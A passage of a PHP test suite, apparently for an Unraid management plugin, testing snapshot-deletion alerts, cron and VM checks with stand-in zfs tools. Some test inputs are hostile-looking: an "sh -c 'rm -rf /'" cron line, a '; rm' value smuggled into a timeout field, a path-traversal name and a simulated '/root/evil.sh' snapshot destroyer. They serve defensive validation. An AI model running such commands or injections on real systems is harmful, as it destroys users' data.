    $quiet = (string) ($o['quiet'] ?? '');
    $busy = (string) ($o['busy'] ?? '');
    check('dash jobs: nothing runs (the agent says so) — the quiet rows: the last backup, not the state file\'s «running»',
        str_contains($quiet, 'Backed up') && !str_contains($quiet, 'right now') && !str_contains($quiet, 'Ms. Snapshotini'), $quiet);
    check('dash jobs: the agent\'s word unknown — the state file as before', str_contains((string) ($o['unknown'] ?? ''), 'Backing up right now'), (string) ($o['unknown'] ?? ''));
    check('dash jobs: at work — the messenger and a line each, linked to the desk, the quiet backup row gone',
        substr_count($busy, 'class="sso-dash-row"') === 13 && (bool) preg_match('~#/jack"><img class="sso-dash-icon" src="[^"]*desks/jack/avatar\.svg~', $busy)
        && str_contains($busy, '#/restore/drill"') && str_contains($busy, 'Offsite · 2 of 3') && !str_contains($busy, 'Backed up'), $busy);
    hardeningRm($tmp);
}

function testWatchmanSnaps(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-snaps-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'extra', 'ssh', 'engine/state', 'mnt/disk1/.btrfs-snap', 'mnt/disk3/.btrfs-snap/20261001-0100'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    foreach (['20261001-0100', '20261006-0100', 'uso-plan-b-20261006-0100'] as $n) {
        @mkdir("$src/mnt/disk1/.btrfs-snap/$n", 0700, true);
    }
    file_put_contents("$src/mnt/disk1/.btrfs-snap/not-a-snapshot.txt", 'x');

    // unit parts first: the list, series, the office's log
    $docker = 'hazel/system/' . str_repeat('ab', 32);
    same('snaps parse: per pool, Docker\'s layers and odd lines left out', ['hazel' => ['hazel/data@a' => ['11', 0], 'hazel/data@b' => ['12', 2]], 'cold' => ['cold@c' => ['13', 0]]],
        watchmanSnapParse("hazel/data@b\t12\t2\nhazel/data@a\t11\t0\n$docker@123\t14\t0\n$docker-init@1\t15\t0\ncold@c\t13\t0\nbad name\nhazel/x@y\tnot\t0\n"));
    same('snaps series: numbers as #', ['uso-plan-daily-#-#', 'autosnap_#-#-#_#:#:#_hourly', 'manual'],
        array_map('watchmanSnapSeries', ['uso-plan-daily-20261006-0100', 'autosnap_2026-10-06_14:00:01_hourly', 'manual']));
    $log = "$src/agent.log";
    file_put_contents($log, "2026-10-06 11:00:00  Deleted: hazel/old@x\n");
    [$ev, $pos] = watchmanSnapOfficeLog($log, null, $now);
    same('office log: without a position, from now on', [[], filesize($log)], [$ev['d'], $pos['size']]);
    file_put_contents($log, "2026-10-06 11:01:00  Deleted: hazel/My Share@a,b\n2026-10-06 11:02:00  Deleted: $src/mnt/disk1/.btrfs-snap/x (btrfs)\n"
        . "2026-10-06 11:03:00  Released: hazel/data@keep\n2026-10-06 11:04:00  Renamed: /mnt/disk1 old → new\n2026-10-06 11:05:00  Snapshot scan: 3 snapshots\n"
        . "2026-10-06 11:06:00  Deleted: half", FILE_APPEND);
    [$ev, $pos2] = watchmanSnapOfficeLog($log, $pos, $now);
    same('office log: her deletions (several at once, btrfs), releases, renames — a line not finished waits',
        [['hazel/My Share@a', 'hazel/My Share@b', "$src/mnt/disk1/.btrfs-snap/x"], ['hazel/data@keep'], [['/mnt/disk1', 'old', 'new', strtotime('2026-10-06 11:04:00')]], filesize($log) - strlen('2026-10-06 11:06:00  Deleted: half')],
        [array_keys($ev['d']), array_keys($ev['r']), $ev['m'], $pos2['size']]);
    rename($log, "$log.1");
    file_put_contents("$log.1", "\n", FILE_APPEND);
    file_put_contents($log, "2026-10-06 11:07:00  Deleted: hazel/new@z\n");
    [$ev] = watchmanSnapOfficeLog($log, $pos2, $now);
    same('office log: rotated — the rest of the old one (by its inode), then the new one', ['hazel/new@z'], array_keys($ev['d']));
    same('office log: what the office removed is remembered a week, the newest time counts', [['b' => $now, 'a' => $now - 10], []],
        [watchmanSnapOfficeMerge(['d' => ['a' => $now - 10, 'old' => $now - 8 * 86400, 'b' => $now - 100], 'm' => [['x', 'y', 'z', $now - 9 * 86400]]],
            ['d' => ['b' => $now]], $now)['d'], watchmanSnapOfficeMerge(['m' => [['x', 'y', 'z', $now - 9 * 86400]]], [], $now)['m']]);
    file_put_contents($log, '');
    @unlink("$log.1");
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'ok', 'started' => $now - 86400, 'finished' => $now - 80000]) . "\n");
    same('engine runs: from history.jsonl (skipped ones left out), status.json while its run goes on', [true, false],
        [watchmanEngineRan(watchmanEngineRuns("$src/engine"), $now - 90000, $now), watchmanEngineRan(watchmanEngineRuns("$src/engine"), $now - 3600, $now)]);

    // the server: hazel and cold (ZFS), disk1 awake and disk3 asleep (btrfs), the boot pool never asked
    $ini = fn (bool $coldAsleep) => file_put_contents("$src/disks.ini", "[\"hazel\"]\nname=\"hazel\"\ntype=\"Cache\"\nfsType=\"zfs\"\nspundown=\"0\"\n"
        . "[\"cold\"]\nname=\"cold\"\ntype=\"Cache\"\nfsType=\"luks:zfs\"\nspundown=\"" . ($coldAsleep ? 1 : 0) . "\"\n"
        . "[\"disk1\"]\nname=\"disk1\"\ntype=\"Data\"\nfsType=\"luks:btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n"
        . "[\"disk3\"]\nname=\"disk3\"\ntype=\"Data\"\nfsType=\"btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"1\"\n"
        . "[\"flash\"]\nname=\"flash\"\ntype=\"Boot\"\nfsType=\"zfs\"\nspundown=\"0\"\n");
    $ini(false);
    $snaps = ['hazel/data@uso-backup-20261001-0100' => ['11', 0], 'hazel/data@uso-backup-20261006-0100' => ['12', 0],
              'hazel/data@uso-plan-daily-20261001-0100' => ['13', 0], 'hazel/data@uso-plan-daily-20261006-0100' => ['14', 0],
              'hazel/data@manual' => ['15', 0], 'hazel/data@keep' => ['16', 1],
              'hazel/media@uso-plan-x-20261005-0100' => ['21', 0], 'hazel/media@uso-plan-x-20261006-0100' => ['22', 0], 'hazel/media@held' => ['23', 1],
              'hazel/_UnraidSecretaryOffice-trash-20261006-110000-old@uso-backup-20261001-0100' => ['31', 0], "$docker@123" => ['41', 0],
              'cold/x@a' => ['51', 0], 'flash/cfg@b' => ['61', 0]];
    $write = function () use (&$snaps, $src) {
        file_put_contents("$src/zfs-list.txt", implode('', array_map(fn ($k, $v) => "$k\t$v[0]\t$v[1]\n", array_keys($snaps), $snaps)));
    };
    $write();
    // stand-ins: zfs lists only the pools it is asked for (and fails while zfs-fails is there); zpool history
    file_put_contents("$tmp/zfs", "#!/bin/sh\nprintf '%s\\n' \"\$*\" >> " . escapeshellarg("$src/zfs-args.txt") . "\n[ -e " . escapeshellarg("$src/zfs-fails") . " ] && exit 1\n"
        . "seen=0\nfor a in \"\$@\"; do\n  [ \$seen = 1 ] && grep -E \"^\$a[/@]\" " . escapeshellarg("$src/zfs-list.txt") . "\n  [ \"\$a\" = -r ] && seen=1\ndone\nexit 0\n");
    file_put_contents("$tmp/zpool", "#!/bin/sh\n[ \"\$1\" = history ] && [ \"\$2\" = -l ] && cat " . escapeshellarg("$src/zpool-history.txt") . "\nexit 0\n");
    chmod("$tmp/zfs", 0755);
    chmod("$tmp/zpool", 0755);
    file_put_contents("$src/zpool-history.txt", '');
    file_put_contents("$src/passwd", "root:x:0:0::/root:/bin/bash\n");
    file_put_contents("$src/syslog", "Oct  6 11:59:00 tower kernel: hello\n");
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'disks_ini' => "$src/disks.ini", 'zfs' => "$tmp/zfs", 'zpool' => "$tmp/zpool", 'mnt' => "$src/mnt",
              'agent_log' => $log, 'engine' => "$src/engine"];
    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $now + $t, fn () => [], false, "$tmp/acks.json", null, true);
    $open = fn () => array_column(array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => watchmanOpen($e) && WATCH_KINDS[$e['kind']][0] === 'snap')), null, 'key');
    $summary = fn () => (readJson("$data/state.json") ?? [])['snaps'] ?? null;

    // his first round: all of it normal; Docker's layers, the boot pool and the sleeping disk left out
    $round(0);
    same('snaps: the first round — nothing told; per pool and disk, the sleeping one named', [[], ['hazel' => 10, 'cold' => 1], ['disk1' => 3], ['disk3']],
        [$open(), $summary()['zfs'] ?? null, $summary()['btrfs'] ?? null, $summary()['asleep'] ?? null]);
    same('snaps: zfs asked for the awake pools only (never the boot pool)', 'list -H -p -t snapshot -o name,guid,userrefs -r hazel cold',
        trim((string) file_get_contents("$src/zfs-args.txt")));
    check('snaps: the lists kept for the next round (snaps.json)', isset((readJson("$data/snaps.json") ?? [])['zfs']['hazel']['s']['hazel/data@keep']));

    // what the office does: Ms. Snapshotini deletes, releases (her log), renames; the engine's run prunes (with a newer one of its
    // own staying); the storeroom is emptied — nothing told
    file_put_contents($log, "2026-10-06 12:02:00  Deleted: hazel/data@uso-plan-daily-20261001-0100\n2026-10-06 12:02:01  Released: hazel/data@keep\n"
        . "2026-10-06 12:02:02  Renamed: hazel/data manual → manual2\n2026-10-06 12:02:03  Snapshot scan: 9 snapshots\n", FILE_APPEND);
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'ok', 'started' => $now + 100, 'finished' => $now + 250]) . "\n", FILE_APPEND);
    unset($snaps['hazel/data@uso-plan-daily-20261001-0100'], $snaps['hazel/data@uso-backup-20261001-0100'], $snaps['hazel/data@manual'],
        $snaps['hazel/_UnraidSecretaryOffice-trash-20261006-110000-old@uso-backup-20261001-0100']);
    $snaps['hazel/data@manual2'] = ['15', 0];
    $snaps['hazel/data@keep'] = ['16', 0];
    $write();
    rmdir("$src/mnt/disk1/.btrfs-snap/20261001-0100");
    $round(300);
    same('snaps: what the office removed — Ms. Snapshotini, the engine\'s retention (ZFS and btrfs), renamed, the storeroom — no news',
        [[], ['engine' => 2, 'office' => 2, 'renamed' => 1, 'storeroom' => 1]], [$open(), $summary()['expected'] ?? null]);

    // an attacker: the newest of the engine's (no run now), a renamed one, one of a plan; a hold released; on disk1 a snapshot of a
    // plan — while cold sleeps (its snapshot missing from the list is never "gone")
    $ini(true);
    unset($snaps['hazel/data@uso-backup-20261006-0100'], $snaps['hazel/data@manual2'], $snaps['hazel/media@uso-plan-x-20261005-0100'], $snaps['cold/x@a']);
    $snaps['hazel/media@held'] = ['23', 0];
    $write();
    rmdir("$src/mnt/disk1/.btrfs-snap/uso-plan-b-20261006-0100");
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'skipped', 'started' => $now + 500, 'finished' => $now + 500]) . "\n", FILE_APPEND);
    file_put_contents("$src/zpool-history.txt", "2026-10-06.11:00:00 zfs destroy hazel/data@older [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:30 zfs destroy hazel/data@uso-backup-20261006-0100,manual2 [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:31 zfs release unraid-secretary-office hazel/media@held [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:32 zfs destroy hazel/media@uso-plan-x-20261005-0100 [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:33 zfs snapshot hazel/data@new [user 0 (root) on tower:linux]\n");
    file_put_contents("$src/syslog", "Oct  6 12:07:29 tower root: zfs destroy started by /root/evil.sh\nOct  6 12:07:31 tower kernel: nothing to see\n", FILE_APPEND);
    $round(600);
    $o = $open();
    $g = $o['snap_gone:zfs:hazel'] ?? [];
    same('snaps gone: on hazel — how many, which datasets, a few of them, their series, zpool history (who, when), the syslog then',
        [3, ['hazel/data', 'hazel/media'], ['hazel/data@manual2', 'hazel/data@uso-backup-20261006-0100', 'hazel/media@uso-plan-x-20261005-0100'], ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#'], 0,
         ['2026-10-06 12:07:30 zfs destroy hazel/data@uso-backup-20261006-0100,manual2 [user 0 (root) on tower:linux]',
          '2026-10-06 12:07:31 zfs release unraid-secretary-office hazel/media@held [user 0 (root) on tower:linux]',
          '2026-10-06 12:07:32 zfs destroy hazel/media@uso-plan-x-20261005-0100 [user 0 (root) on tower:linux]'],
         ['12:07:29 root: zfs destroy started by /root/evil.sh']],
        [$g['count'] ?? null, $g['p']['datasets'] ?? null, $g['p']['names'] ?? null, $g['p']['series'] ?? null, $g['p']['held'] ?? null, $g['p']['history'] ?? null, $g['p']['evidence'] ?? null]);
    same('snaps gone: on disk1 (btrfs) — and nothing for cold, asleep', [['snap_gone:btrfs:disk1', 'snap_gone:zfs:hazel', 'snap_hold_released:zfs:hazel'], ['disk1/.btrfs-snap/uso-plan-b-20261006-0100'], []],
        [(function (array $a) { sort($a); return $a; })(array_keys($o)), $o['snap_gone:btrfs:disk1']['p']['names'] ?? null, $o['snap_gone:btrfs:disk1']['p']['history'] ?? null]);
    same('snaps: a hold released, not by Ms. Snapshotini', [1, ['hazel/media@held'], 2],
        [$o['snap_hold_released:zfs:hazel']['count'] ?? null, $o['snap_hold_released:zfs:hazel']['p']['names'] ?? null, count($o['snap_hold_released:zfs:hazel']['p']['history'] ?? [])]);
    same('snaps gone in words', '3 snapshots vanished on hazel — not removed by the office: hazel/data@manual2, hazel/data@uso-backup-20261006-0100, hazel/media@uso-plan-x-20261005-0100',
        officeNotifyText('watchman', 'entry.snap_gone', ['n' => 3] + watchmanText($g, 'en'), 'en'));
    $checks = array_column(watchmanChecks($data), null, 'id');
    same('snaps: the team lead hears of both — important, so to Unraid\'s notifications too', ['recommended', 'recommended', true, true],
        [$checks['snap_gone']['level'] ?? null, $checks['snap_hold_released']['level'] ?? null, WATCH_KINDS['snap_gone'][1], WATCH_KINDS['snap_hold_released'][1]]);
    same('snaps: the sleeping pool named', ['cold', 'disk3'], $summary()['asleep'] ?? null);

    // cold awake again, its snapshot there: it slept, nothing went
    $ini(false);
    $snaps['cold/x@a'] = ['51', 0];
    $snaps['hazel/media@uso-plan-x-20261007-0100'] = ['24', 0];
    $write();
    $round(900);
    same('snaps: a pool that slept is compared with its list from before — nothing gone', [3, 1], [$open()['snap_gone:zfs:hazel']['count'] ?? null, count($open()) === 3 ? 1 : 0]);

    // «I know, thanks»: a retention of yours — its series may go while a newer one stays; another series, or the last of one, is told
    watchmanAck($g['id'], $data, $now + 950, false);
    same('snaps ack: the series learned', ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#'], array_keys(watchmanLoad($data)['baseline']['snaps']['series'] ?? []));
    unset($snaps['hazel/media@uso-plan-x-20261006-0100'], $snaps['hazel/data@uso-plan-daily-20261006-0100']);
    $write();
    $round(1200);
    $o = $open();
    same('snaps learned: a plan of yours pruned (a newer one stays) is quiet; another series is told', [1, ['hazel/data@uso-plan-daily-20261006-0100']],
        [$o['snap_gone:zfs:hazel']['count'] ?? null, $o['snap_gone:zfs:hazel']['p']['names'] ?? null]);

    // zfs not answering: nothing compared, the lists kept — what went meanwhile is told once it answers again
    touch("$src/zfs-fails");
    unset($snaps['cold/x@a']);
    $write();
    $round(1500);
    same('snaps: zfs not answering — nothing told, the list kept', [false, true], [isset($open()['snap_gone:zfs:cold']), isset((readJson("$data/snaps.json") ?? [])['zfs']['cold']['s']['cold/x@a'])]);
    unlink("$src/zfs-fails");
    $round(1800);
    same('snaps: answering again — what went meanwhile', ['cold/x@a'], $open()['snap_gone:zfs:cold']['p']['names'] ?? null);

    // the page: what he follows
    $page = watchmanPageState($data, $now + 1810, false);
    same('snaps on the page: per pool and disk, the series learned', [['hazel' => 3, 'cold' => 0], ['disk1' => 1], ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#']],
        [$page['snaps']['zfs'] ?? null, $page['snaps']['btrfs'] ?? null, $page['snaps']['series'] ?? null]);
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    check('snaps: the page\'s words', isset($en['group.snap'], $en['group_title.snap'], $en['watch.snaps'], $en['help.snaps_text'], $en['detail.history']));
    @unlink(watchmanLockFile($data, 'book'));
    @unlink(watchmanLockFile($data, 'round'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * «Where is what» (Ms. Whereabouts' up to 1.30, Ms. Dustdevil's now) after the night watchman took
 * security: her cron lines whose program went with its plugin (order, not security — the watchman no
 * longer tells them), her tips that stayed, the ones that went to him, and the one that points to him
 * while he isn't hired.
 */
function testWhereAfterWatchman(): void
{
    same('wa cron: the program behind an interpreter, none for inline code or a name', ['/usr/local/x/run.php', '/a/b.sh', null, null, '/x'],
        [waCronProgram('/usr/bin/php -q /usr/local/x/run.php arg'), waCronProgram('nice -n 10 bash "/a/b.sh" x'),
         waCronProgram("sh -c 'rm -rf /'"), waCronProgram('logger hello'), waCronProgram('timeout 60 LANG=C /x')]);
    $gone = fn (string $p) => false;
    same('wa cron: a program gone with its plugin (never under /mnt, never odd characters, never outside a plugin\'s folder)', ['vmbackup', 'oldplug', null, null, null],
        [waCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', $gone), waCronGone('/boot/config/plugins/oldplug/x.sh', $gone),
         waCronGone('/mnt/user/x/y.sh', $gone), waCronGone('/usr/local/sbin/mdcmd', $gone), waCronGone("/usr/local/emhttp/plugins/x/a'b.sh", $gone)]);
    same('wa cron: still there — nothing to say', null, waCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', fn (string $p) => true));

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_POSTURE) as $id) {
        check("where: security tip $id is the watchman's now", !str_contains($js, "add('$id',") && !isset($en["where.adv.$id.title"]));
    }
    foreach (['system_array', 'mover', 'compose_build', 'spindown_default', 'spindown_some', 'old_disks', 'no_parity', 'parity', 'ups', 'syslog', 'cron_dead', 'vm_windows', 'vm_sparse', 'vm_netmodel', 'vm_migratable', 'security'] as $id) {
        check("where: tip $id is hers", str_contains($js, "add('$id',") && isset($en["where.adv.$id.title"], $en["where.adv.$id.why"]));
    }
    $advice = waAdvice([], [], []);
    same('where: her advice reads no security settings any more', [false, false, false], [isset($advice['telnet']), isset($advice['ftp']), isset($advice['cpu'])]);
}

/**
 * Ms. Dustdevil's tip about «Migratable» On (2026-10-12): Unraid's VM form sets `cpumigrate = on` for new VMs, the switch
 * only exists with CPU mode Host Passthrough (`<cpu mode='host-passthrough' migratable='on'>`); libvirt then hides CPU
 * features a live migration couldn't take along — no RAM or CPU cost, but the guest sees fewer capabilities. Read from
 * the VM's XML (as waVm() reads it, never virsh): XML files the shape uso-test's have — on, off, and a VM in emulated
 * mode (no switch: no tip). Good to know, never «needs resources».
 */
function testWhereVmMigratable(): void
{
    $tmp = hardeningTmp('wamigrate');
    $xml = fn (string $name, string $cpu) => "<?xml version='1.0' encoding='UTF-8'?>\n<domain type='kvm'>\n  <name>$name</name>\n  <memory unit='KiB'>1048576</memory>\n"
        . "  <vcpu placement='static'>2</vcpu>\n  <os>\n    <type arch='x86_64' machine='pc-q35-9.2'>hvm</type>\n  </os>\n$cpu  <clock offset='utc'/>\n  <devices/>\n</domain>\n";
    file_put_contents("$tmp/Lab-On.xml", $xml('Lab-On', "  <cpu mode='host-passthrough' check='none' migratable='on'/>\n"));
    file_put_contents("$tmp/Lab-Off.xml", $xml('Lab-Off', "  <cpu mode='host-passthrough' check='none' migratable='off'>\n    <topology sockets='1' dies='1' clusters='1' cores='1' threads='2'/>\n  </cpu>\n"));
    file_put_contents("$tmp/Emulated.xml", $xml('Emulated', "  <cpu mode='custom' match='exact' check='none'>\n    <model fallback='forbid'>qemu64</model>\n  </cpu>\n"));
    file_put_contents("$tmp/NoCpu.xml", $xml('NoCpu', ''));
    $dom = fn (string $name) => simplexml_load_string((string) file_get_contents("$tmp/$name.xml"));
    same('wa vm migratable: Host Passthrough with «Migratable» On — yes; Off, emulated, no <cpu>, unreadable — no', [true, false, false, false, false],
        [waVmCpuMigratable($dom('Lab-On')), waVmCpuMigratable($dom('Lab-Off')), waVmCpuMigratable($dom('Emulated')), waVmCpuMigratable($dom('NoCpu')), waVmCpuMigratable(false)]);
    $vms = array_map(fn ($n) => ['name' => $n, 'cpu_migratable' => waVmCpuMigratable($dom($n))], ['Lab-On', 'Lab-Off', 'Emulated', 'NoCpu']);
    $vms[] = ['name' => 'a-Second', 'cpu_migratable' => true];
    $vms[] = ['name' => 'Odd', 'cpu_migratable' => 'yes'];
    same('wa vm migratable: the VMs with it, sorted — never Off, emulated, an odd shape', ['a-Second', 'Lab-On'], waVmMigratable($vms));
    same('wa vm migratable: only Off and emulated VMs — no tip', [], waVmMigratable([$vms[1], $vms[2]]));
    same('wa vm migratable: her advice carries the names', ['a-Second', 'Lab-On'], waAdvice([], [], [], $vms)['vm_migratable']);
    $src = (string) file_get_contents(OFFICE_DIR . '/agent/lib/where.php');
    check('wa vm migratable: waVm() reads it from the VM\'s XML (no virsh for it)', str_contains($src, "'cpu_migratable' => waVmCpuMigratable(\$dom),")
        && !preg_match('/function waVmCpuMigratable[^}]*virsh/s', $src));
    hardeningRm($tmp);

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    check('where: the «Migratable» tip is hers — info, the names, a link to Unraid\'s VMs page, the names as its signature',
        str_contains($js, "add('vm_migratable', 'info', { names: listNames(migratable, 3), n: migratable.length }, { path: '/VMs', text: T('where.adv.to_vms') }, migratable.join(','));"));
    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
        $t = json_decode((string) file_get_contents(OFFICE_DIR . "/public/desks/cleanup/lang/$l.json"), true) ?: [];
        $why = (string) ($t['where.adv.vm_migratable.why'] ?? '');
        check("where ($l): the «Migratable» tip names the way in Unraid — ⟦VMs⟧ → ⟦Edit⟧ → ⟦Migratable⟧ beside ⟦CPU Mode⟧ (⟦Host Passthrough⟧), Off, the VM stopped",
            str_contains($t['where.adv.vm_migratable.title']['other'] ?? '', '{names}') && str_contains($why, '⟦VMs⟧') && str_contains($why, '⟦Edit⟧')
            && substr_count($why, '⟦Migratable⟧') === 2 && substr_count($why, '⟦CPU Mode⟧') === 2 && str_contains($why, '⟦Host Passthrough⟧') && str_contains($why, '→ Off'));
    }
    $de = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/de.json'), true) ?: [];
    check('where (de): «kann Leistung kosten», never «braucht Ressourcen»', str_contains($de['where.adv.vm_migratable.why'] ?? '', 'kann Leistung kosten')
        && !str_contains($de['where.adv.vm_migratable.why'] ?? '', 'Ressourcen'));
}

/**
 * Ms. Dustdevil's tip about Windows VMs at the array stop (Ms. Whereabouts' up to 1.30; 2026-10-07: the array stop waited
 * domain.cfg's TIMEOUT="180" for an idle Windows 11 that ignored the power button, then Unraid switched
 * it off hard): the VM shutdown and disk shutdown time-outs as Unraid reads them, and whether the guest
 * agent answers — from libvirt's status file of a running VM (RAM), the shape a large server's has.
 */
function testWhereVmStop(): void
{
    same('wa vm stop: the time-outs as set', ['timeout' => 180, 'disk_timeout' => 400], waVmStop(['TIMEOUT' => '180'], ['shutdownTimeout' => '400']));
    same('wa vm stop: empty or odd — Unraid\'s defaults (60 s, 90 s)', [['timeout' => 60, 'disk_timeout' => 90], ['timeout' => 60, 'disk_timeout' => 90]],
        [waVmStop([], []), waVmStop(['TIMEOUT' => '-5'], ['shutdownTimeout' => "90\n; rm"])]);

    $status = fn (string $channel) => "<domstatus state='running' reason='booted' pid='3046851'>\n  <monitor path='/var/lib/libvirt/qemu/domain-3/monitor.sock' type='unix'/>\n"
        . "  <domain type='kvm' id='3'>\n    <name>Windows_11_A</name>\n    <metadata>\n      <vmtemplate xmlns=\"http://unraid\" name=\"Windows 11\" os=\"windowstpm\"/>\n    </metadata>\n"
        . "    <devices>\n      <channel type='unix'>\n        <source mode='bind' path='/run/libvirt/qemu/channel/3-Windows_11_A/org.qemu.guest_agent.0'/>\n"
        . "        $channel\n        <alias name='channel0'/>\n      </channel>\n    </devices>\n  </domain>\n</domstatus>\n";
    same('wa vm agent: the guest agent answers / doesn\'t / no state yet / no channel / unreadable', ['connected', 'disconnected', 'disconnected', 'none', null, null],
        [waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0' state='connected'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0' state='disconnected'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.spice.0' state='connected'/>")),
         waVmAgentState('<domstatus'), waVmAgentState('')]);
    $tmp = hardeningTmp('wavmstop');
    file_put_contents("$tmp/Win11.xml", $status("<target type='virtio' name='org.qemu.guest_agent.0' state='connected'/>"));
    symlink("$tmp/Win11.xml", "$tmp/Linked.xml");
    same('wa vm agent: by the VM\'s name — not a link, no path in the name, nothing when there is no file', ['connected', null, null, null, null],
        [waVmAgent('Win11', $tmp), waVmAgent('Linked', $tmp), waVmAgent('../' . basename($tmp) . '/Win11', $tmp), waVmAgent('.hidden', $tmp), waVmAgent('Gone', $tmp)]);
    hardeningRm($tmp);

    // the NIC model (2026-10-08: «virtio-net» has no vhost — 2.2 Gbit/s per stream on a large server, 93 with «virtio»);
    // the interfaces as a large server's XML has them (Debian_VM: virtio-net, Lab-Server: virtio + vhost, the drill VM: e1000)
    $iface = fn (string $mac, string $bridge, string $model, string $driver = '') => "    <interface type='bridge'>\n      <mac address='$mac'/>\n"
        . "      <source bridge='$bridge'/>\n      <model type='$model'/>\n$driver      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>\n    </interface>\n";
    $domXml = fn (string $name, string $ifaces) => "<domain type='kvm'>\n  <name>$name</name>\n  <devices>\n$ifaces    <serial type='pty'>\n"
        . "      <target type='isa-serial' port='0'>\n        <model name='isa-serial'/>\n      </target>\n    </serial>\n  </devices>\n</domain>\n";
    $vmOf = fn (string $name, string $ifaces) => ['name' => $name, 'networks' => waVmNets(simplexml_load_string($domXml($name, $ifaces)))];
    $debvm = $vmOf('Debian_VM', $iface('52:54:00:70:ed:1b', 'br0.13', 'virtio-net'));
    same('wa vm nets: MAC, bridge and model as the XML has them (the serial port\'s <model name=…> is no NIC)',
        [['mac' => '52:54:00:70:ed:1b', 'source' => 'br0.13', 'model' => 'virtio-net']], $debvm['networks']);
    $vms = [$vmOf('Windows_11_B', $iface('52:54:00:73:5c:4e', 'br0', 'virtio-net')),
            $vmOf('Lab-Server', $iface('52:54:00:32:f5:ab', 'br0', 'virtio', "      <driver name='vhost' queues='3'/>\n")
                . $iface('52:54:00:aa:10:01', 'br-uso', 'virtio', "      <driver name='vhost' queues='3'/>\n")),
            $vmOf('Mixed', $iface('52:54:00:00:00:01', 'br0', 'virtio') . $iface('52:54:00:00:00:02', 'br0', 'virtio-net')),
            $vmOf('USO-Restori-test-VM', $iface('52:54:00:c5:02:13', 'br0', 'e1000')),
            $debvm, $vmOf('No_NIC', ''), ['name' => 'Odd', 'networks' => 'virtio-net']];
    same('wa vm netmodel: the VMs with a «virtio-net» NIC (one is enough), sorted — never «virtio», e1000, none, an odd shape',
        ['Debian_VM', 'Mixed', 'Windows_11_B'], waVmNetModel($vms));
    same('wa vm netmodel: none — nothing to say', [], waVmNetModel([$vms[1], $vms[3]]));
    same('wa vm netmodel: her advice carries the names', ['Debian_VM', 'Mixed', 'Windows_11_B'], waAdvice([], [], [], $vms)['vm_netmodel']);

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    check('where: the NIC model tip is hers — info, the names, a link to Unraid\'s VMs page, the how with Unraid\'s labels',
        (bool) preg_match("/add\\('vm_netmodel', 'info', \\{ names: listNames\\(slowNet, 3\\), n: slowNet.length \\}, \\{ path: '\\/VMs'/", $js)
        && str_contains($en['where.adv.vm_netmodel.title']['other'] ?? '', '{names}') && str_contains($en['where.adv.vm_netmodel.why'] ?? '', '⟦Network Model⟧')
        && str_contains($en['where.adv.vm_netmodel.why'] ?? '', '⟦VMs⟧ → the VM → ⟦Edit⟧'));
    check('where: the Windows VM tip is hers, with the current time-outs', str_contains($js, "add('vm_windows',") && isset($en['where.adv.vm_windows.title'], $en['where.adv.vm_windows.why'])
        && str_contains($en['where.adv.vm_windows.why']['other'] ?? '', '{timeout}') && str_contains($en['where.adv.vm_windows.why']['other'] ?? '', '{disk}'));
}

/**
 * Sparse VM disks and Kopia's first upload (2026-10-07: a Windows VM's vdisk2.img, 1.6 TB apparent and 21 GB
 * allocated plus two qcow2 overlays - its snapshot said 382 GB, Kopia read 2 TB in 2.7 h, the holes as zeros; Mr.
 * Backupsy had reckoned with 382 GB): Mr. Backupsy's first-upload estimate reckons a VM's own source by the apparent
 * size of the files in its folders (one lstat each, links and anything beyond a few thousand entries left out, a sleeping
 * place not looked at), an app's and a share's still by logicalreferenced; Ms. Dustdevil's tip about a VM disk file far
 * bigger than what it holds (waFileSizes(): bytes and allocated per disk and overlay base, waSparseDisk(): at least 4x
 * and 200 GB more), her page's note on such a file, Mr. Backupsy's VM rows and the «Everything local + Kopia» start's
 * words (testBackupPresets), and the engine's order (testBackupKopiaOrder).
 */
function testBackupSparse(): void
{
    $tmp = hardeningTmp('sparse');
    @mkdir("$tmp/testpool/domains/Win_11/sub", 0700, true);
